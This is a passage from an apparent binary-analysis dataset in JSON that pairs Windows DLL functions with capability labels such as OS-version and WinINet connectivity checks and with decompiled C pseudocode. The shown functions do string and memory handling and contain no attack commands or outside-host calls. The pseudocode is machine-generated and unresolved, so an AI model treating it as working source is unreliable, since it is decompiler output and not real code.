  while (puVar12 != NULL) {\n                        puVar2 = puVar12[2];\n                        puVar12[2] = 0;\n                        (***puVar12)(puVar12, 1);\n                        puVar12 = puVar2;\n                    }\n                }\n            }\n            puStack496 = NULL;\n            if ((piStack464 != NULL) && (puVar12 = (**(*piStack464 + 0x10))(),  puVar12 != NULL)) {\n                (***puVar12)(puVar12, 1);\n            }\n            puStack456 = NULL;\n            fcn.180010540(auStack448);\n            fcn.1800131f0(&puStack456, L\", +([^,]*)\", 0x1800f64dc);\n            uStack544 = *0x180101900;\n            uStack540 = *0x180101904;\n            uStack536 = *0x180101908;\n            uStack532 = *0x18010190c;\n            uStack560 = uStack560._2_2_ << 0x10;\n            uStack664 = 1;\n            uStack112 = *0x180101900;\n            uStack108 = *0x180101904;\n            uStack104 = *0x180101908;\n            uStack100 = *0x18010190c;\n            uStack128 = 0;\n            fcn.180010d70(&uStack128, 0x1800f64c0, 3);\n            puVar16 = &uStack192;\n            if (7 < uStack168) {\n                puVar16 = CONCAT44(uStack188, CONCAT22(uStack192._2_2_, uStack192));\n            }\n            puVar15 = &uStack192;\n            if (7 < uStack168) {\n                puVar15 = CONCAT44(uStack188, CONCAT22(uStack192._2_2_, uStack192));\n            }\n            puStack688 = &uStack128;\n            ppuStack696 = &puStack456;\n            fcn.180015730(auStack216, &uStack560, puVar15, puVar16 + iStack176);\n            if (7 < CONCAT44(uStack100, uStack104)) {\n                iVar4 = CONCAT62(Stack126, uStack128);\n                iVar17 = iVar4;\n                if ((0xfff < CONCAT44(uStack100, uStack104) * 2 + 2) &&\n                   (iVar17 = *(iVar4 + -8),  0x1f < (iVar4 - iVar17) - 8U)) goto code_r0x000180029da1;\n                fcn.18008fb24(iVar17);\n            }\n            if (7 < uStack168) {\n                iVar4 = CONCAT44(uStack188, CONCAT22(uStack192._2_2_, uStack192));\n                iVar17 = iVar4;\n                if (0xfff < uStack168 * 2 + 2) {\n                    iVar17 = *(iVar4 + -8);\n                    if (0x1f < (iVar4 - iVar17) - 8U) {\n                        fcn.1800b3528(iVar17, uStack168 * 2 + 0x29);\n                        goto code_r0x000180029dad;\n                    }\n                }\n                fcn.18008fb24(iVar17);\n            }\n            uVar8 = *0x18010190c;\n            uVar7 = *0x180101908;\n            uVar6 = *0x180101904;\n            uVar5 = *0x180101900;\n            uStack192._0_2_ = uStack560;\n            uStack192._2_2_ = uStack560 >> 0x10;\n            uStack188 = uStack556;\n            uStack184 = uStack552;\n            uStack180 = uStack548;\n            iStack176 = CONCAT44(uStack540, uStack544);\n            uStack168 = CONCAT44(uStack532, uStack536);\n            uStack544 = *0x180101900;\n            uStack540 = *0x180101904;\n            uStack536 = *0x180101908;\n            uStack532 = *0x18010190c;\n            uStack560 = uStack192._2_2_ << 0x10;\n            if (puStack456 != NULL) {\n                LOCK();\n                piVar1 = puStack456 + 0x2c;\n                iVar9 = *piVar1;\n                *piVar1 = *piVar1 + -1;\n                puVar12 = puStack456;\n                if (iVar9 == 1) {\n                    while (puVar12 != NULL) {\n                        puVar2 = puVar12[2];\n                        puVar12[2] = 0;\n                        (***puVar12)(puVar12, 1);\n                        puVar12 = puVar2;\n                    }\n                }\n            }\n            puStack456 = NULL;\n            if ((piStack424 != NULL) && (puVar12 = (**(*piStack424 + 0x10))(),  puVar12 != NULL)) {\n                (***puVar12)(puVar12, 1);\n            }\n            puStack416 = NULL;\n            fcn.180010540(auStack408);\n            fcn.1800131f0(&puStack416, L\"^ +(.*[^ ]) +$\", 0x1800f6504);\n            uStack512 = *0x180101900;\n            uStack508 = *0x180101904;\n            uStack504 = *0x180101908;\n            uStack500 = *0x18010190c;\n            uStack528 = uStack528._2_2_ << 0x10;\n            uStack664 = 2;\n            uStack80 = *0x180101900;\n            uStack76 = *0x180101904;\n            uStack72 = *0x180101908;\n            uStack68 = *0x18010190c;\n            uStack96 = 0;\n            fcn.180010d70(&uStack96, 0x1800f64e0, 2);\n            puVar16 = &uStack192;\n            if (7 < uStack168) {\n                puVar16 = CONCAT44(uStack188, CONCAT22(uStack192._2_2_, uStack192));\n            }\n            puVar15 = &uStack192;\n            if (7 < uStack168) {\n                puVar15 = CONCAT44(uStack188, CONCAT22(uStack192._2_2_, uStack192));\n            }\n            puStack688 = &uStack96;\n            ppuStack696 = &puStack416;\n            fcn.180015730(auStack208, &uStack528, puVar15, puVar16 + iStack176);\n            if (7 < CONCAT44(uStack68, uStack72)) {\n                iVar4 = CONCAT62(Stack94, uStack96);\n                iVar17 = iVar4;\n                if ((0xfff < CONCAT44(uStack68, uStack72) * 2 + 2) &&\n                   (iVar17 = *(iVar4 + -8),  0x1f < (iVar4 - iVar17) - 8U)) {\ncode_r0x000180029dad:\n                    fcn.1800b3528();\n                    pcVar3 = swi(3);\n                    (*pcVar3)();\n                    return;\n                }\n                fcn.18008fb24(iVar17);\n            }\n            if (7 < uStack168) {\n                iVar4 = CONCAT44(uStack188, CONCAT22(uStack192._2_2_, uStack192));\n                iVar17 = iVar4;\n                if (uStack168 * 2 + 2 < 0x1000) {\ncode_r0x000180029770:\n                    fcn.18008fb24(iVar17);\n                    goto code_r0x000180029775;\n                }\n                iVar17 = *(iVar4 + -8);\n                if ((iVar4 - iVar17) - 8U < 0x20) goto code_r0x000180029770;\n                fcn.1800b3528(iVar17, uStack168 * 2 + 0x29);\ncode_r0x000180029db9:\n                fcn.1800b3528();\ncode_r0x000180029dbf:\n                fcn.1800b3528();\ncode_r0x000180029dc5:\n                fcn.1800b3528();\ncode_r0x000180029dcb:\n                fcn.1800b3528();\ncode_r0x000180029dd1:\n                fcn.1800b3528();\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\ncode_r0x000180029775:\n            uVar8 = *0x18010190c;\n            uVar7 = *0x180101908;\n            uVar6 = *0x180101904;\n            uVar5 = *0x180101900;\n            uStack192._0_2_ = uStack528;\n            uStack192._2_2_ = uStack528 >> 0x10;\n            uStack188 = uStack524;\n            uStack184 = uStack520;\n            uStack180 = uStack516;\n            iStack176 = CONCAT44(uStack508, uStack512);\n            uStack168 = CONCAT44(uStack500, uStack504);\n            uStack512 = *0x180101900;\n            uStack508 = *0x180101904;\n            uStack504 = *0x180101908;\n            uStack500 = *0x18010190c;\n            uStack528 = uStack192._2_2_ << 0x10;\n            if (puStack416 != NULL) {\n                LOCK();\n                piVar1 = puStack416 + 0x2c;\n                iVar9 = *piVar1;\n                *piVar1 = *piVar1 + -1;\n                puVar12 = puStack416;\n                if (iVar9 == 1) {\n                    while (puVar12 != NULL) {\n                        puVar2 = puVar12[2];\n                        puVar12[2] = 0;\n                        (***puVar12)(puVar12, 1);\n                        puVar12 = puVar2;\n                    }\n                }\n            }\n            puStack416 = NULL;\n            if ((piStack384 != NULL) && (puVar12 = (**(*piStack384 + 0x10))(),  puVar12 != NULL)) {\n                (***puVar12)(puVar12, 1);\n            }\n            puVar16 = iVar18 + 0x40;\n            if (puVar16 != &uStack192) {\n                puVar15 = &uStack192;\n                if (7 < uStack168) {\n                    puVar15 = CONCAT44(uStack188, CONCAT22(uStack192._2_2_, uStack192));\n                }\n                fcn.180010d70(puVar16, puVar15, iStack176);\n            }\n            puStack376 = NULL;\n            fcn.180010540(auStack368);\n            fcn.1800131f0(&puStack376, 0x1800f6204, 0x1800f6206);\n            uStack640 = *0x180101900;\n            uStack636 = *0x180101904;\n            uStack632 = *0x180101908;\n            uStack628 = *0x18010190c;\n            uStack656 = 0;\n            uStack664 = 4;\n            uStack48 = *0x180101900;\n            uStack44 = *0x180101904;\n            uStack40 = *0x180101908;\n            uStack36 = *0x18010190c;\n            uStack64 = 0;\n            fcn.180010d70(&uStack64, 0x1800f6508, 2);\n            puVar16 = &uStack192;\n            if (7 < uStack168) {\n                puVar16 = CONCAT44(uStack188, CONCAT22(uStack192._2_2_, uStack192));\n            }\n            puVar15 = &uStack192;\n            if (7 < uStack168) {\n                puVar15 = CONCAT44(uStack188, CONCAT22(uStack192._2_2_, uStack192));\n            }\n            puStack688 = &uStack64;\n            ppuStack696 = &puStack376;\n            fcn.180015730(auStack200, &uStack656, puVar15, puVar16 + iStack176);\n            if (7 < CONCAT44(uStack36, uStack40)) {\n                iVar4 = CONCAT62(Stack62, uStack64);\n                iVar17 = iVar4;\n                if ((0xfff < CONCAT44(uStack36, uStack40) * 2 + 2) &&\n                   (iVar17 = *(iVar4 + -8),  0x1f < (iVar4 - iVar17) - 8U)) goto code_r0x000180029db9;\n                fcn.18008fb24(iVar17);\n            }\n            puVar16 = &uStack656;\n            if (7 < CONCAT44(uStack628, uStack632)) {\n                puVar16 = CONCAT62(Stack654, uStack656);\n            }\n            (**0x1800de778)(*(arg1 + 0x30), puVar16);\n            if (7 < CONCAT44(uStack628, uStack632)) {\n                iVar4 = CONCAT62(Stack654, uStack656);\n                iVar17 = iVar4;\n                if ((0xfff < CONCAT44(uStack628, uStack632) * 2 + 2) &&\n                   (iVar17 = *(iVar4 + -8),  0x1f < (iVar4 - iVar17) - 8U)) goto code_r0x000180029dbf;\n                fcn.18008fb24(iVar17);\n            }\n            uStack628 = *0x18010190c;\n            uStack632 = *0x180101908;\n            uStack636 = *0x180101904;\n            uStack640 = *0x180101900;\n            uStack656 = 0;\n            if (puStack376 != NULL) {\n                LOCK();\n                piVar1 = puStack376 + 0x2c;\n                iVar9 = *piVar1;\n                *piVar1 = *piVar1 + -1;\n                puVar12 = puStack376;\n                if (iVar9 == 1) {\n                    while (puVar12 != NULL) {\n                        puVar2 = puVar12[2];\n                        puVar12[2] = 0;\n                        (***puVar12)(puVar12, 1);\n                        puVar12 = puVar2;\n                    }\n                }\n            }\n            puStack376 = NULL;\n            if ((piStack344 != NULL) && (puVar12 = (**(*piStack344 + 0x10))(),  puVar12 != NULL)) {\n                (***puVar12)(puVar12, 1);\n            }\n            pppppppuVar14 = apppppppuStack160;\n            if (7 < uStack136) {\n                pppppppuVar14 = apppppppuStack160[0];\n            }\n            (**0x1800de5f0)(*(arg1 + 0x38), pppppppuVar14, 0x8000);\n            puStack336 = NULL;\n            fcn.180010540(auStack328);\n            fcn.1800131f0(&puStack336, 0x1800f6510, 0x1800f6514);\n            pppppppuVar14 = apppppppuStack160;\n            if (7 < uStack136) {\n                pppppppuVar14 = apppppppuStack160[0];\n            }\n            uStack576 = *0x180101900;\n            uStack572 = *0x180101904;\n            uStack568 = *0x180101908;\n            uStack564 = *0x18010190c;\n            uStack592 = 0;\n            iVar17 = -1;\n            do {\n                iVar17 = iVar17 + 1;\n            } while (*(pppppppuVar14 + iVar17 * 2) != 0);\n            fcn.180010d70(&uStack592, pppppppuVar14, iVar17);\n            puVar11 = fcn.180013060(&uStack264, &uStack592, &puStack336, 0x1800f623c);\n            if (&uStack192 != puVar11) {\n                if (7 < uStack168) {\n                    iVar4 = CONCAT44(uStack188, CONCAT22(uStack192._2_2_, uStack192));\n                    iVar17 = iVar4;\n                    if ((0xfff < uStack168 * 2 + 2) && (iVar17 = *(iVar4 + -8),  0x1f < (iVar4 - iVar17) - 8U))\n                    goto code_r0x000180029dc5;\n                    fcn.18008fb24(iVar17);\n                }\n                uStack192._0_2_ = *puVar11;\n                uStack192._2_2_ = *puVar11 >> 0x10;\n                uStack188 = puVar11[1];\n                uStack184 = puVar11[2];\n                uStack180 = puVar11[3];\n                iStack176 = *(puVar11 + 4);\n                uStack168 = *(puVar11 + 6);\n                *(puVar11 + 4) = 0;\n                *(puVar11 + 6) = 7;\n                *puVar11 = 0;\n            }\n            if (7 < uStack240) {\n                iVar4 = CONCAT62(Stack262, uStack264);\n                iVar17 = iVar4;\n                if ((0xfff < uStack240 * 2 + 2) && (iVar17 = *(iVar4 + -8),  0x1f < (iVar4 - iVar17) - 8U))\n                goto code_r0x000180029dc5;\n                fcn.18008fb24(iVar17);\n            }\n            uStack248 = CONCAT44(*0x180101904, *0x180101900);\n            uStack240 = CONCAT44(*0x18010190c, *0x180101908);\n            uStack264 = 0;\n            if (7 < CONCAT44(uStack564, uStack568)) {\n                iVar4 = CONCAT62(Stack590, uStack592);\n                iVar17 = iVar4;\n                if ((0xfff < CONCAT44(uStack564, uStack568) * 2 + 2) &&\n                   (iVar17 = *(iVar4 + -8),  0x1f < (iVar4 - iVar17) - 8U)) goto code_r0x000180029dcb;\n                fcn.18008fb24(iVar17);\n            }\n            uStack564 = *0x18010190c;\n            uStack568 = *0x180101908;\n            uStack572 = *0x180101904;\n            uStack576 = *0x180101900;\n            uStack592 = 0;\n            if (puStack336 != NULL) {\n                LOCK();\n                piVar1 = puStack336 + 0x2c;\n                iVar9 = *piVar1;\n                *piVar1 = *piVar1 + -1;\n                puVar12 = puStack336;\n                if (iVar9 == 1) {\n                    while (puVar12 != NULL) {\n                        puVar2 = puVar12[2];\n                        puVar12[2] = 0;\n                        (***puVar12)(puVar12, 1);\n                        puVar12 = puVar2;\n                    }\n                }\n            }\n            puStack336 = NULL;\n            if ((piStack304 != NULL) && (puVar12 = (**(*piStack304 + 0x10))(),  puVar12 != NULL)) {\n                (***puVar12)(puVar12, 1);\n            }\n            puVar16 = &uStack192;\n            if (7 < uStack168) {\n                puVar16 = CONCAT44(uStack188, CONCAT22(uStack192._2_2_, uStack192));\n            }\n            do {\n                iVar13 = iVar13 + 1;\n            } while (puVar16[iVar13] != 0);\n            fcn.180010d70(iVar18 + 0x60, puVar16, iVar13);\n            *(arg1 + 0x61) = 0;\n            *(arg1 + 100) = 1;\n            fcn.180028690(arg1);\n            if (7 < uStack168) {\n                iVar18 = CONCAT44(uStack188, CONCAT22(uStack192._2_2_, uStack192));\n                iVar13 = iVar18;\n                if ((0xfff < uStack168 * 2 + 2) && (iVar13 = *(iVar18 + -8),  0x1f < (iVar18 - iVar13) - 8U))\n                goto code_r0x000180029dd1;\n                fcn.18008fb24(iVar13);\n            }\n            iStack176 = CONCAT44(*0x180101904, *0x180101900);\n            uStack168 = CONCAT44(*0x18010190c, *0x180101908);\n            uStack192._0_2_ = 0;\n            if (uStack136 < 8) goto code_r0x000180029d63;\n            pppppppuVar14 = apppppppuStack160[0];\n            if (0xfff < uStack136 * 2 + 2) {\n                pppppppuVar14 = apppppppuStack160[0][-1];\n                if (0x1f < apppppppuStack160[0] + (-8 - pppppppuVar14)) {\n                    fcn.1800b3528(iStack176, pppppppuVar14, uStack136 * 2 + 0x29);\n                    goto code_r0x000180029d95;\n                }\n            }\n            fcn.18008fb24(pppppppuVar14);\ncode_r0x000180029d63:\n            fcn.18008fb00(uStack32 ^ auStack728);\n            return;\n        }\n        iVar4 = CONCAT62(Stack622, uStack624);\n        iVar17 = iVar4;\n        if ((CONCAT44(uStack596, uStack600) * 2 + 2 < 0x1000) || (iVar17 = *(iVar4 + -8),  (iVar4 - iVar17) - 8U < 0x20)\n           ) {\n            fcn.18008fb24(iVar17);\n            goto code_r0x0001800293db;\n        }\n    }\n    else {\n        if (uStack168 < 8) {\ncode_r0x0001800292ff:\n            uStack188 = puVar11[1];\n            uStack184 = puVar11[2];\n            uStack180 = puVar11[3];\n            uStack192._0_2_ = *puVar11;\n            uStack192._2_2_ = *puVar11 >> 0x10;\n            iStack176 = *(puVar11 + 4);\n            uStack168 = *(puVar11 + 6);\n            *(puVar11 + 4) = 0;\n            *(puVar11 + 6) = 7;\n            *puVar11 = 0;\n            goto code_r0x00018002933c;\n        }\n        iVar4 = CONCAT44(uStack188, CONCAT22(uStack192._2_2_, uStack192));\n        iVar17 = iVar4;\n        if ((uStack168 * 2 + 2 < 0x1000) || (iVar17 = *(iVar4 + -8),  (iVar4 - iVar17) - 8U < 0x20)) {\n            fcn.18008fb24(iVar17);\n            goto code_r0x0001800292ff;\n        }\ncode_r0x000180029d95:\n        fcn.1800b3528();\n    }\n    fcn.1800b3528();\ncode_r0x000180029da1:\n    fcn.1800b3528();\n    pcVar3 = swi(3);\n    (*pcVar3)();\n    return;\n}\n",
        "token_count": 7229
    },
    "180029de": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180029de0(int64_t arg1)\n\n{\n    uint64_t uVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    ulong *puVar4;\n    code *pcVar5;\n    int64_t iVar6;\n    ulong **ppuVar7;\n    ushort *puVar8;\n    uint *puVar9;\n    ulong *puVar10;\n    int64_t iVar11;\n    int64_t iVar12;\n    ulong *******pppppppuVar13;\n    ushort *puVar14;\n    uint64_t uVar15;\n    ulong *******arg3;\n    ulong arg4;\n    uchar extraout_XMM0 [16];\n    uchar extraout_XMM0_00 [16];\n    uchar extraout_XMM0_01 [16];\n    uchar auVar16 [16];\n    uint uVar17;\n    uint uVar18;\n    uint uVar19;\n    uint uVar20;\n    uint uVar21;\n    uint uVar22;\n    uint uVar23;\n    uint uVar24;\n    uchar auStack440 [32];\n    ulong **ppuStack408;\n    ushort *puStack400;\n    uint uStack376;\n    ulong uStack368;\n    uint64_t uStack352;\n    uint uStack344;\n    uint uStack340;\n    ushort uStack336;\n    ushort uStack334;\n    uint uStack332;\n    uint uStack328;\n    uint uStack324;\n    uchar auStack320 [16];\n    ushort uStack304;\n    unkbyte6 Stack302;\n    uint uStack288;\n    uint uStack284;\n    uint uStack280;\n    uint uStack276;\n    ulong *puStack272;\n    uchar auStack264 [24];\n    int64_t *piStack240;\n    ulong uStack232;\n    ulong *******pppppppuStack224;\n    uchar auStack216 [8];\n    uint uStack208;\n    uint uStack204;\n    uint uStack200;\n    uint uStack196;\n    uint uStack192;\n    uint uStack188;\n    uint uStack184;\n    uint uStack180;\n    ulong *******apppppppuStack176 [2];\n    int64_t iStack160;\n    uint64_t uStack152;\n    uchar auStack144 [16];\n    uchar auStack128 [16];\n    ushort uStack112;\n    unkbyte6 Stack110;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint64_t uStack80;\n    \n    uStack232 = 0xfffffffffffffffe;\n    uStack80 = *0x180123080 ^ auStack440;\n    uStack376 = 0;\n    iStack160 = 0;\n    uStack152 = 7;\n    apppppppuStack176[0] = apppppppuStack176[0] & 0xffffffffffff0000;\n    pppppppuStack224 = fcn.180011cf0(apppppppuStack176, 0x108);\n    iStack160 = 0x105;\n    uStack152 = 0x107;\n    pppppppuVar13 = pppppppuStack224;\n    for (iVar11 = 0x105; iVar11 != 0; iVar11 = iVar11 + -1) {\n        *pppppppuVar13 = 0;\n        pppppppuVar13 = pppppppuVar13 + 2;\n    }\n    *(pppppppuStack224 + 0x20a) = 0;\n    apppppppuStack176[0] = pppppppuStack224;\n    (**0x1800de5f0)(*(arg1 + 0xc0), pppppppuStack224, 0x104);\n    pppppppuVar13 = apppppppuStack176;\n    if (7 < uStack152) {\n        pppppppuVar13 = apppppppuStack176[0];\n    }\n    iVar11 = -1;\n    do {\n        iVar11 = iVar11 + 1;\n    } while (*(pppppppuVar13 + iVar11 * 2) != 0);\n    fcn.180010d70(apppppppuStack176, pppppppuVar13, iVar11);\n    auStack128 = CONCAT412(*0x18010190c, CONCAT48(*0x180101908, CONCAT44(*0x180101904, *0x180101900)));\n    auStack144 = ZEXT1416(auStack144._2_14_) << 0x10;\n    fcn.180010d70(auStack144, 0x1800f62a4, 1);\n    if (iStack160 == 0) goto code_r0x00018002a358;\n    uStack352 = CONCAT44(*0x180101904, *0x180101900);\n    uStack344 = *0x180101908;\n    uStack340 = *0x18010190c;\n    uStack368._0_2_ = 0;\n    uStack376 = 1;\n    fcn.18000d550(&uStack368, *0x180123f50 + 1);\n    if (CONCAT44(uStack340, uStack344) == uStack352) {\n        ppuStack408 = 0x1;\n        fcn.180013690(&uStack368, 1, 0, 0x1800f632c);\n    }\n    else {\n        uVar15 = uStack352 + 1;\n        puVar8 = &uStack368;\n        if (7 < CONCAT44(uStack340, uStack344)) {\n            puVar8 = CONCAT62(uStack368._2_6_, uStack368);\n        }\n        puVar14 = puVar8 + uStack352;\n        uStack352 = uVar15;\n        *puVar14 = 0x5b;\n        puVar8[uVar15] = 0;\n    }\n    uVar15 = uStack352;\n    ppuVar7 = *0x180123f50;\n    arg4 = 0x180123f40;\n    if (7 < *0x180123f58) {\n        arg4 = *0x180123f40;\n    }\n    if (CONCAT44(uStack340, uStack344) - uStack352 < *0x180123f50) {\n        ppuStack408 = *0x180123f50;\n        fcn.180013690(&uStack368, *0x180123f50, 0, arg4);\n        auVar16 = extraout_XMM0_00;\n    }\n    else {\n        puVar8 = &uStack368;\n        if (7 < CONCAT44(uStack340, uStack344)) {\n            puVar8 = CONCAT62(uStack368._2_6_, uStack368);\n        }\n        puVar14 = puVar8 + uStack352;\n        uStack352 = uStack352 + *0x180123f50;\n        fcn.1800ade80(puVar14, arg4, *0x180123f50 * 2);\n        puVar8[ppuVar7 + uVar15] = 0;\n        auVar16 = extraout_XMM0;\n    }\n    uVar15 = uStack352;\n    if (CONCAT44(uStack340, uStack344) == uStack352) {\n        ppuStack408 = 0x1;\n        puVar9 = fcn.180013690(&uStack368, 1, 0, 0x1800f62d4);\n        auVar16 = extraout_XMM0_01;\n    }\n    else {\n        uVar1 = uStack352 + 1;\n        uStack352 = uVar1;\n        puVar8 = &uStack368;\n        if (7 < CONCAT44(uStack340, uStack344)) {\n            puVar8 = CONCAT62(uStack368._2_6_, uStack368);\n        }\n        puVar8[uVar15] = 0x5d;\n        puVar8[uVar1] = 0;\n        puVar9 = &uStack368;\n    }\n    auStack320 = auVar16 & 0x0;\n    uStack336 = *puVar9;\n    uStack334 = *puVar9 >> 0x10;\n    uStack332 = puVar9[1];\n    uStack328 = puVar9[2];\n    uStack324 = puVar9[3];\n    auStack320 = *(puVar9 + 4);\n    *(puVar9 + 4) = 0;\n    *(puVar9 + 6) = 7;\n    *puVar9 = 0;\n    uStack376 = 3;\n    puStack272 = NULL;\n    fcn.180010540(auStack264);\n    puVar8 = &uStack336;\n    if (7 < auStack320._8_8_) {\n        puVar8 = CONCAT44(uStack332, CONCAT22(uStack334, uStack336));\n    }\n    puVar14 = &uStack336;\n    if (7 < auStack320._8_8_) {\n        puVar14 = CONCAT44(uStack332, CONCAT22(uStack334, uStack336));\n    }\n    fcn.1800131f0(&puStack272, puVar14, puVar8 + auStack320._0_8_);\n    uStack288 = *0x180101900;\n    uStack284 = *0x180101904;\n    uStack280 = *0x180101908;\n    uStack276 = *0x18010190c;\n    uStack304 = 0;\n    uStack376 = 7;\n    uStack96 = *0x180101900;\n    uStack92 = *0x180101904;\n    uStack88 = *0x180101908;\n    uStack84 = *0x18010190c;\n    uStack112 = 0;\n    fcn.180010d70(&uStack112, 0x1800f6518, 3);\n    pppppppuVar13 = apppppppuStack176;\n    if (7 < uStack152) {\n        pppppppuVar13 = apppppppuStack176[0];\n    }\n    arg3 = apppppppuStack176;\n    if (7 < uStack152) {\n        arg3 = apppppppuStack176[0];\n    }\n    puStack400 = &uStack112;\n    ppuStack408 = &puStack272;\n    fcn.180015730(auStack216, &uStack304, arg3, pppppppuVar13 + iStack160 * 2);\n    uVar15 = CONCAT44(uStack84, uStack88);\n    if (uVar15 < 8) {\ncode_r0x00018002a191:\n        puVar9 = fcn.180014b80(&uStack304, uVar15, 0x1800f634c, 1);\n        uVar17 = *puVar9;\n        uVar18 = puVar9[1];\n        uVar19 = puVar9[2];\n        uVar20 = puVar9[3];\n        uVar21 = puVar9[4];\n        uVar22 = puVar9[5];\n        uVar23 = puVar9[6];\n        uVar24 = puVar9[7];\n        *(puVar9 + 4) = 0;\n        *(puVar9 + 6) = 7;\n        *puVar9 = 0;\n        uStack208 = uVar17;\n        uStack204 = uVar18;\n        uStack200 = uVar19;\n        uStack196 = uVar20;\n        uStack192 = uVar21;\n        uStack188 = uVar22;\n        uStack184 = uVar23;\n        uStack180 = uVar24;\n        if (7 < auStack128._8_8_) {\n            iVar11 = auStack144._0_8_;\n            if ((auStack128._8_8_ * 2 + 2 < 0x1000) ||\n               (iVar11 = *(auStack144._0_8_ + -8),  (auStack144._0_8_ - iVar11) - 8U < 0x20)) {\n                fcn.18008fb24(iVar11);\n                goto code_r0x00018002a206;\n            }\n            goto code_r0x00018002a440;\n        }\ncode_r0x00018002a206:\n        auStack144 = CONCAT412(uVar20, CONCAT48(uVar19, CONCAT44(uVar18, uVar17)));\n        auStack128 = CONCAT412(uVar24, CONCAT48(uVar23, CONCAT44(uVar22, uVar21)));\n        if (7 < CONCAT44(uStack276, uStack280)) {\n            iVar12 = CONCAT62(Stack302, uStack304);\n            iVar11 = iVar12;\n            if ((CONCAT44(uStack276, uStack280) * 2 + 2 < 0x1000) ||\n               (iVar11 = *(iVar12 + -8),  (iVar12 - iVar11) - 8U < 0x20)) {\n                fcn.18008fb24(iVar11);\n                goto code_r0x00018002a24e;\n            }\n            goto code_r0x00018002a446;\n        }\ncode_r0x00018002a24e:\n        uStack276 = *0x18010190c;\n        uStack280 = *0x180101908;\n        uStack284 = *0x180101904;\n        uStack288 = *0x180101900;\n        uStack304 = 0;\n        if (puStack272 != NULL) {\n            LOCK();\n            piVar2 = puStack272 + 0x2c;\n            iVar3 = *piVar2;\n            *piVar2 = *piVar2 + -1;\n            puVar10 = puStack272;\n            if (iVar3 == 1) {\n                while (puVar10 != NULL) {\n                    puVar4 = puVar10[2];\n                    puVar10[2] = 0;\n                    (***puVar10)(puVar10, 1);\n                    puVar10 = puVar4;\n                }\n            }\n        }\n        puStack272 = NULL;\n        if ((piStack240 != NULL) && (puVar10 = (**(*piStack240 + 0x10))(),  puVar10 != NULL)) {\n            (***puVar10)(puVar10, 1);\n        }\n        if (7 < auStack320._8_8_) {\n            iVar12 = CONCAT44(uStack332, CONCAT22(uStack334, uStack336));\n            iVar11 = iVar12;\n            if ((auStack320._8_8_ * 2 + 2 < 0x1000) || (iVar11 = *(iVar12 + -8),  (iVar12 - iVar11) - 8U < 0x20)) {\n                fcn.18008fb24(iVar11);\n                goto code_r0x00018002a302;\n            }\n            goto code_r0x00018002a44c;\n        }\ncode_r0x00018002a302:\n        auStack320 = CONCAT88(CONCAT44(*0x18010190c, *0x180101908), CONCAT44(*0x180101904, *0x180101900));\n        uStack336 = 0;\n        if (CONCAT44(uStack340, uStack344) < 8) {\ncode_r0x00018002a358:\n            auStack144._0_8_ = auStack144;\n            if (7 < auStack128._8_8_) {\n            }\n            (**0x1800de778)(*(arg1 + 200), auStack144._0_8_);\n            if (7 < auStack128._8_8_) {\n                iVar11 = auStack144._0_8_;\n                if ((0xfff < auStack128._8_8_ * 2 + 2) &&\n                   (iVar11 = *(auStack144._0_8_ + -8),  0x1f < (auStack144._0_8_ - iVar11) - 8U))\n                goto code_r0x00018002a458;\n                fcn.18008fb24(iVar11);\n            }\n            auStack128 = CONCAT88(CONCAT44(*0x18010190c, *0x180101908), CONCAT44(*0x180101904, *0x180101900));\n            auStack144 = auStack144 & 0xffffffffffff0000;\n            if (uStack152 < 8) goto code_r0x00018002a402;\n            pppppppuVar13 = apppppppuStack176[0];\n            if (0xfff < uStack152 * 2 + 2) {\n                pppppppuVar13 = apppppppuStack176[0][-1];\n                if (0x1f < apppppppuStack176[0] + (-8 - pppppppuVar13)) {\n                    fcn.1800b3528(CONCAT44(*0x180101904, *0x180101900), pppppppuVar13, uStack152 * 2 + 0x29);\n                    goto code_r0x00018002a43a;\n                }\n            }\n            fcn.18008fb24(pppppppuVar13);\ncode_r0x00018002a402:\n            fcn.18008fb00(uStack80 ^ auStack440);\n            return;\n        }\n        iVar12 = CONCAT62(uStack368._2_6_, uStack368);\n        iVar11 = iVar12;\n        if ((CONCAT44(uStack340, uStack344) * 2 + 2 < 0x1000) ||\n           (iVar11 = *(iVar12 + -8),  (iVar12 - iVar11) - 8U < 0x20)) {\n            fcn.18008fb24(iVar11);\n            goto code_r0x00018002a358;\n        }\n    }\n    else {\n        iVar11 = uVar15 * 2;\n        uVar15 = iVar11 + 2;\n        iVar6 = CONCAT62(Stack110, uStack112);\n        iVar12 = iVar6;\n        if (uVar15 < 0x1000) {\ncode_r0x00018002a18c:\n            fcn.18008fb24(iVar12);\n            goto code_r0x00018002a191;\n        }\n        uVar15 = iVar11 + 0x29;\n        iVar12 = *(iVar6 + -8);\n        if ((iVar6 - iVar12) - 8U < 0x20) goto code_r0x00018002a18c;\ncode_r0x00018002a43a:\n        fcn.1800b3528();\ncode_r0x00018002a440:\n        fcn.1800b3528();\ncode_r0x00018002a446:\n        fcn.1800b3528();\ncode_r0x00018002a44c:\n        fcn.1800b3528();\n    }\n    fcn.1800b3528();\ncode_r0x00018002a458:\n    fcn.1800b3528();\n    pcVar5 = swi(3);\n    (*pcVar5)();\n    return;\n}\n",
        "token_count": 4289
    },
    "18002a46": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
